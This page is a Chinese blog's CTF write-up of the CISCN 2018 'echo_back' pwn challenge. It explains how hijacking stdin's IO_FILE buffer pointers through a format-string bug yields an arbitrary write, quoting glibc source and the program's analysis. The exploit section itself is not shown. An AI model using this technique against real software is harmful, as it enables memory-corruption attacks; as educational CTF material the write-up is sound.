<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CISCN-2018-Quals  echo_back | sixpar&#39;s blog</title>
  <meta name="keywords" content=" 格式化字串 , IO_File ">
  <meta name="description" content="CISCN-2018-Quals  echo_back | sixpar&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
<meta property="og:type" content="website">
<meta property="og:title" content="about">
<meta property="og:url" content="http://yoursite.com/about/index.html">
<meta property="og:site_name" content="sixpar&#39;s blog">
<meta property="og:description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-07-02T13:45:54.000Z">
<meta property="article:modified_time" content="2020-07-04T03:37:23.628Z">
<meta property="article:author" content="sixpar">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/sunburst.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 4.2.1"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
</div>


<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>sixpar</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/ccjacoo" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=570791563&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
</div>




<ul>
    <li><div class="all active" data-rel="All">All<small>(41)</small></div></li>
    
        
            
            <li><div data-rel="PWN题">PWN题<small>(16)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="笔记">笔记<small>(7)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="系列">系列<small>(9)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="生活">生活<small>(4)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="学习">学习<small>(3)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="逆向题">逆向题<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">About</a><a style="width: 50%"  class="friends">Friends</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="41">
<input type="hidden" id="yelog_site_word_count" value="62k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://47.107.81.38">sixpar的小站</a></li>
            
            <li><a target="_blank" href="http://v3ged4g.top">V3D4师傅</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" />
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Bypass-Canary</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>canary</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ctfwiki</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>DynELF</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>fd</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>gdb</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>heap</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IO_File</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IO缓冲区</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>partial_write</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pyc反编译</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>reverse</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ROP</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>shellcode</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>tcache dup</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>UAF</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>webpwn</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>入门</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>关于我</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>内核</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>劫持函数</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>基础</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>天问计划</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>实验</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>延迟绑定</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>数组溢出</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>日记</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>格式化字串</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>汇编</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a  class="All 系列 "
           href="/2020/07/25/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week9-day6/"
           data-tag="天问计划"
           data-author="" >
            <span class="post-title" title="天问计划week9-day6">天问计划week9-day6</span>
            <span class="post-date" title="2020-07-25 10:41:06">2020/07/25</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/24/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week9-day5/"
           data-tag="天问计划"
           data-author="" >
            <span class="post-title" title="天问计划week9-day5">天问计划week9-day5</span>
            <span class="post-date" title="2020-07-24 22:20:40">2020/07/24</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/23/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week9-day4/"
           data-tag="天问计划"
           data-author="" >
            <span class="post-title" title="天问计划weeek9-day4">天问计划weeek9-day4</span>
            <span class="post-date" title="2020-07-23 23:11:16">2020/07/23</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/22/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week9-day3/"
           data-tag="天问计划"
           data-author="" >
            <span class="post-title" title="天问计划week9-day">天问计划week9-day</span>
            <span class="post-date" title="2020-07-22 22:12:41">2020/07/22</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/19/0day%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-2-4%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/"
           data-tag="实验"
           data-author="" >
            <span class="post-title" title="0day安全实验-2.4代码植入">0day安全实验-2.4代码植入</span>
            <span class="post-date" title="2020-07-19 20:27:06">2020/07/19</span>
        </a>
        
        <a  class="All 生活 "
           href="/2020/07/19/%EF%BC%88%E8%BD%AC%EF%BC%89%E6%B5%85%E8%B0%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="（转）浅谈二进制漏洞与病毒研究">（转）浅谈二进制漏洞与病毒研究</span>
            <span class="post-date" title="2020-07-19 15:08:34">2020/07/19</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6%E9%A2%98-stack2/"
           data-tag="ROP,数组溢出"
           data-author="" >
            <span class="post-title" title="攻防世界pwn进阶题-stack2">攻防世界pwn进阶题-stack2</span>
            <span class="post-date" title="2020-07-19 09:26:26">2020/07/19</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6%E9%A2%98-babyfengshui/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="攻防世界pwn进阶题-babyfengshui">攻防世界pwn进阶题-babyfengshui</span>
            <span class="post-date" title="2020-07-18 14:37:24">2020/07/18</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6pwn%E9%A2%98-easypwn/"
           data-tag="格式化字串,partial_write"
           data-author="" >
            <span class="post-title" title="攻防世界进阶pwn题-easypwn">攻防世界进阶pwn题-easypwn</span>
            <span class="post-date" title="2020-07-17 21:19:04">2020/07/17</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6-easyfmt/"
           data-tag="格式化字串"
           data-author="" >
            <span class="post-title" title="攻防世界pwn进阶-easyfmt">攻防世界pwn进阶-easyfmt</span>
            <span class="post-date" title="2020-07-16 22:24:45">2020/07/16</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%9D%E9%98%B6%E5%9B%9E%E9%A1%BE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="攻防世界初阶回顾">攻防世界初阶回顾</span>
            <span class="post-date" title="2020-07-16 16:24:59">2020/07/16</span>
        </a>
        
        <a  class="All 生活 "
           href="/2020/07/15/2020%E5%B9%B47%E6%9C%8815%E6%97%A5%E5%B0%8F%E8%AE%B0/"
           data-tag="日记"
           data-author="" >
            <span class="post-title" title="2020年7月15日小记">2020年7月15日小记</span>
            <span class="post-date" title="2020-07-15 22:07:29">2020/07/15</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/13/DynELF-L-CTF-2016-pwn100/"
           data-tag="DynELF,ROP"
           data-author="" >
            <span class="post-title" title="DynELF--L-CTF-2016-pwn100">DynELF--L-CTF-2016-pwn100</span>
            <span class="post-date" title="2020-07-13 14:39:51">2020/07/13</span>
        </a>
        
        <a  class="All 逆向题 "
           href="/2020/07/12/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2019-1-%E6%9D%A5%E7%8E%A9%E8%9B%87%E5%90%A7/"
           data-tag="reverse,pyc反编译"
           data-author="" >
            <span class="post-title" title="安恒月赛2019.1-来玩蛇吧">安恒月赛2019.1-来玩蛇吧</span>
            <span class="post-date" title="2020-07-12 23:12:05">2020/07/12</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/12/plaidctf-2013-ropasaurusrex-DynELF/"
           data-tag="DynELF,ROP"
           data-author="" >
            <span class="post-title" title="plaidctf-2013-ropasaurusrex(DynELF)">plaidctf-2013-ropasaurusrex(DynELF)</span>
            <span class="post-date" title="2020-07-12 22:13:50">2020/07/12</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/11/CISCN-2018-Quals-echo-back/"
           data-tag="格式化字串,IO_File"
           data-author="" >
            <span class="post-title" title="CISCN-2018-Quals  echo_back">CISCN-2018-Quals  echo_back</span>
            <span class="post-date" title="2020-07-11 23:22:35">2020/07/11</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/09/dl-runtime-resolve%E5%87%BD%E6%95%B0%E8%BF%87%E7%A8%8B/"
           data-tag="延迟绑定"
           data-author="" >
            <span class="post-title" title="_dl_runtime_resolve函数过程">_dl_runtime_resolve函数过程</span>
            <span class="post-date" title="2020-07-09 10:01:47">2020/07/09</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/09/pwnable-tw-start/"
           data-tag="汇编,shellcode"
           data-author="" >
            <span class="post-title" title="pwnable.tw-start">pwnable.tw-start</span>
            <span class="post-date" title="2020-07-09 00:08:11">2020/07/09</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/08/%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8/"
           data-tag="内核"
           data-author="" >
            <span class="post-title" title="教你如何编译内核">教你如何编译内核</span>
            <span class="post-date" title="2020-07-08 18:24:00">2020/07/08</span>
        </a>
        
        <a  class="All 学习 "
           href="/2020/07/07/IO%E7%BC%93%E5%86%B2%E5%8C%BA/"
           data-tag="IO缓冲区"
           data-author="" >
            <span class="post-title" title="IO缓冲区">IO缓冲区</span>
            <span class="post-date" title="2020-07-07 15:06:28">2020/07/07</span>
        </a>
        
        <a  class="All 学习 "
           href="/2020/07/07/file-descriptor%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/"
           data-tag="fd"
           data-author="" >
            <span class="post-title" title="file_descriptor文件描述符">file_descriptor文件描述符</span>
            <span class="post-date" title="2020-07-07 13:29:46">2020/07/07</span>
        </a>
        
        <a  class="All 生活 "
           href="/2020/07/06/%E4%B8%8B%E4%B8%80%E9%98%B6%E6%AE%B5%E8%A7%84%E5%88%92/"
           data-tag="关于我"
           data-author="" >
            <span class="post-title" title="下一阶段规划">下一阶段规划</span>
            <span class="post-date" title="2020-07-06 10:15:46">2020/07/06</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/05/X-MAS-CTF-web%E5%92%8Cpwn%E7%BB%93%E5%90%88/"
           data-tag="webpwn"
           data-author="" >
            <span class="post-title" title="X-MAS-CTF-web和pwn结合">X-MAS-CTF-web和pwn结合</span>
            <span class="post-date" title="2020-07-05 23:11:34">2020/07/05</span>
        </a>
        
        <a  class="All 学习 "
           href="/2020/07/05/%E4%BB%80%E4%B9%88%E6%98%AFweb-server/"
           data-tag="webpwn"
           data-author="" >
            <span class="post-title" title="什么是web_server">什么是web_server</span>
            <span class="post-date" title="2020-07-05 21:37:36">2020/07/05</span>
        </a>
        
        <a  class="All 生活 "
           href="/2020/07/05/%E7%94%9F%E6%B4%BB%E5%8C%BA%E5%BC%80%E7%AF%87/"
           data-tag="关于我"
           data-author="" >
            <span class="post-title" title="生活区开篇">生活区开篇</span>
            <span class="post-date" title="2020-07-05 16:07:45">2020/07/05</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="格式化字串"
           data-author="" >
            <span class="post-title" title="格式化字符串漏洞总结">格式化字符串漏洞总结</span>
            <span class="post-date" title="2020-07-05 14:48:42">2020/07/05</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/05/Bypass-Canary%E7%B3%BB%E5%88%97-%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0/"
           data-tag="Bypass-Canary,格式化字串,劫持函数"
           data-author="" >
            <span class="post-title" title="Bypass-Canary系列-劫持stack_chk_fail函数">Bypass-Canary系列-劫持stack_chk_fail函数</span>
            <span class="post-date" title="2020-07-05 10:00:41">2020/07/05</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-one-by-one-%E7%88%86%E7%A0%B4/"
           data-tag="Bypass-Canary"
           data-author="" >
            <span class="post-title" title="Bypass-Canary系列-one-by-one-爆破">Bypass-Canary系列-one-by-one-爆破</span>
            <span class="post-date" title="2020-07-04 23:26:42">2020/07/04</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-%E6%B3%84%E9%9C%B2Canary%E5%80%BC/"
           data-tag="Bypass-Canary,格式化字串"
           data-author="" >
            <span class="post-title" title="Bypass-Canary系列-泄露Canary值">Bypass-Canary系列-泄露Canary值</span>
            <span class="post-date" title="2020-07-04 18:32:52">2020/07/04</span>
        </a>
        
        <a  class="All 系列 "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-%E7%B3%BB%E5%88%97%E4%BB%8B%E7%BB%8D/"
           data-tag="Bypass-Canary"
           data-author="" >
            <span class="post-title" title="Bypass-Canary系列-系列介绍">Bypass-Canary系列-系列介绍</span>
            <span class="post-date" title="2020-07-04 16:41:05">2020/07/04</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/04/%E6%9F%A5%E7%9C%8B%E4%B8%80%E4%B8%AAELF%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%A1%E6%81%AF/"
           data-tag="基础"
           data-author="" >
            <span class="post-title" title="查看一个ELF文件的信息">查看一个ELF文件的信息</span>
            <span class="post-date" title="2020-07-04 14:58:18">2020/07/04</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/04/ELF%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
           data-tag="基础"
           data-author="" >
            <span class="post-title" title="ELF保护机制">ELF保护机制</span>
            <span class="post-date" title="2020-07-04 14:33:16">2020/07/04</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/03/PWN%E5%85%A5%E9%97%A8%E5%9F%BA%E7%A1%80/"
           data-tag="入门"
           data-author="" >
            <span class="post-title" title="PWN入门基础">PWN入门基础</span>
            <span class="post-date" title="2020-07-03 13:05:08">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/bjdctf-2020-babyrop2/"
           data-tag="ROP,canary"
           data-author="" >
            <span class="post-title" title="bjdctf_2020_babyrop2">bjdctf_2020_babyrop2</span>
            <span class="post-date" title="2020-07-03 12:47:06">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/bjdctf-2020-babyrop/"
           data-tag="ROP"
           data-author="" >
            <span class="post-title" title="bjdctf_2020_babyrop">bjdctf_2020_babyrop</span>
            <span class="post-date" title="2020-07-03 12:40:13">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/BJDCTF-2nd-ydsneedgirlfriend2/"
           data-tag="UAF,tcache dup"
           data-author="" >
            <span class="post-title" title="[BJDCTF 2nd]ydsneedgirlfriend2">[BJDCTF 2nd]ydsneedgirlfriend2</span>
            <span class="post-date" title="2020-07-03 12:22:23">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/HITCON-training-hacknote-UAF/"
           data-tag="UAF,ctfwiki"
           data-author="" >
            <span class="post-title" title="HITCON-training-hacknote(UAF)">HITCON-training-hacknote(UAF)</span>
            <span class="post-date" title="2020-07-03 10:43:46">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/2018%E9%A6%96%E5%B1%8A%E7%BD%91%E5%AE%89%E7%9C%81%E8%B5%9B-cont/"
           data-tag="heap"
           data-author="" >
            <span class="post-title" title="2018首届网安省赛 -cont">2018首届网安省赛 -cont</span>
            <span class="post-date" title="2020-07-03 09:04:04">2020/07/03</span>
        </a>
        
        <a  class="All 笔记 "
           href="/2020/07/03/gdb%E8%B0%83%E8%AF%95%E6%80%BB%E7%BB%93/"
           data-tag="gdb"
           data-author="" >
            <span class="post-title" title="gdb调试总结">gdb调试总结</span>
            <span class="post-date" title="2020-07-03 07:10:59">2020/07/03</span>
        </a>
        
        <a  class="All PWN题 "
           href="/2020/07/03/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B-uninit/"
           data-tag="ROP"
           data-author="" >
            <span class="post-title" title="第二届浙江省网安竞赛初赛-uninit">第二届浙江省网安竞赛初赛-uninit</span>
            <span class="post-date" title="2020-07-03 01:15:23">2020/07/03</span>
        </a>
        
        <a  class="All "
           href="/2020/07/02/hello-world/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Hello World">Hello World</span>
            <span class="post-date" title="2020-07-02 20:49:04">2020/07/02</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-CISCN-2018-Quals-echo-back" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">CISCN-2018-Quals  echo_back</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="PWN题">PWN题</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color1">格式化字串</a>
            
            <a class="color3">IO_File</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2020-07-11 23:48:09'>2020-07-11 23:22</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:3.6k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="跳转至评论区">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-File："><span class="toc-text">IO_File：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-new-file-underflow-函数："><span class="toc-text">_IO_new_file_underflow 函数：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析："><span class="toc-text">程序分析：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#setName功能："><span class="toc-text">setName功能：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#echo-back功能："><span class="toc-text">echo_back功能：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程："><span class="toc-text">解题过程：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IO-File结构体："><span class="toc-text">IO_File结构体：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结："><span class="toc-text">小结：</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <blockquote>
<p>正常情况下我们用户的输入长度和写入位置都会受到程序限制的,不可能让用户任意地址任意长度写入;<br>但是利用特定的漏洞,我们可以修改到 IO结构体 中的指针,就可以绕过约束</p>
</blockquote>
<h2 id="IO-File："><a href="#IO-File：" class="headerlink" title="IO_File："></a>IO_File：</h2><h3 id="IO-new-file-underflow-函数："><a href="#IO-new-file-underflow-函数：" class="headerlink" title="_IO_new_file_underflow 函数："></a>_IO_new_file_underflow 函数：</h3><p>调用scanf函数最终是从stdin中读取数据的，而stdin是一个FILE (_IO_FILE) 结构体指针。<br>_IO_new_file_underflow函数揭示了scanf输入的内部结构，它最终会调用_IO_SYSREAD系统调用来读取文件。这是本题的关键知识点。<br>贴上源码：</p>
<pre><code class="c">int
_IO_new_file_underflow (_IO_FILE *fp)
{
  _IO_ssize_t count;
#if 0
  /* SysV does not make this test; take it out for compatibility */
  if (fp-&gt;_flags &amp; _IO_EOF_SEEN)
    return (EOF);
#endif

  if (fp-&gt;_flags &amp; _IO_NO_READS)
    {
      fp-&gt;_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return EOF;
    }
  if (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)
    return *(unsigned char *) fp-&gt;_IO_read_ptr;

  if (fp-&gt;_IO_buf_base == NULL)
    {
      /* Maybe we already have a push back pointer.  */
      if (fp-&gt;_IO_save_base != NULL)
    {
      free (fp-&gt;_IO_save_base);
      fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;
    }
      _IO_doallocbuf (fp);
    }
  if (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))
    {
#if 0
      _IO_flush_all_linebuffered ();
#else
      _IO_acquire_lock (_IO_stdout);

      if ((_IO_stdout-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))
      == (_IO_LINKED | _IO_LINE_BUF))
    _IO_OVERFLOW (_IO_stdout, EOF);

      _IO_release_lock (_IO_stdout);
#endif
    }

  _IO_switch_to_get_mode (fp);
  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;
  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end
    = fp-&gt;_IO_buf_base;

  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,
               fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);
  if (count &lt;= 0)
    {
      if (count == 0)
    fp-&gt;_flags |= _IO_EOF_SEEN;
      else
    fp-&gt;_flags |= _IO_ERR_SEEN, count = 0;
  }
  fp-&gt;_IO_read_end += count;
  if (count == 0)
    {
      fp-&gt;_offset = _IO_pos_BAD;
      return EOF;
    }
  if (fp-&gt;_offset != _IO_pos_BAD)
    _IO_pos_adjust (fp-&gt;_offset, count);
  return *(unsigned char *) fp-&gt;_IO_read_ptr;
}
libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)</code></pre>
<p> _IO_new_file_underflow 函数中第17行存在一个检测，if(fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)，则表明输入缓冲区里存在数据，则直接返回一个read_ptr指针。<br>如果这个if不成立(即fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end时)则无需返回，继续执行下面。</p>
<p>对源码做一下总结：<br>当fp-&gt;_IO_read_ptr == fp-&gt;_IO_read_end时,就可以通过系统调用向fp-&gt;_IO_buf_base处写入数据啦，并且写入的长度为 fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</p>
<p>所以只要我们可以控制以下这4个指针,那么基本就可以任意地址任意写了;</p>
<blockquote>
<p>_IO_read_ptr<br>_IO_read_end<br>_IO_buf_base<br>_IO_buf_end</p>
</blockquote>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p>保护机制全开：</p>
<blockquote>
<p>Arch:     amd64-64-little<br>RELRO:    Full RELRO<br>Stack:    Canary found<br>NX:       NX enabled<br>PIE:      PIE enabled</p>
</blockquote>
<p>程序菜单只显示三个功能：setName 、 echo_back 、 exit</p>
<h3 id="setName功能："><a href="#setName功能：" class="headerlink" title="setName功能："></a>setName功能：</h3><p>首先检测v5是否不为1，不为1则执行以下：</p>
<blockquote>
<p>printf(“name:”);<br>return read(0, a1, 7uLL);</p>
</blockquote>
<p>只能输入7个字节。<br>并且name输入完后，把v5变量置为1，说明name只能输入一次。</p>
<h3 id="echo-back功能："><a href="#echo-back功能：" class="headerlink" title="echo_back功能："></a>echo_back功能：</h3><blockquote>
<p> printf((const char *)&amp;nbytes + 4);</p>
</blockquote>
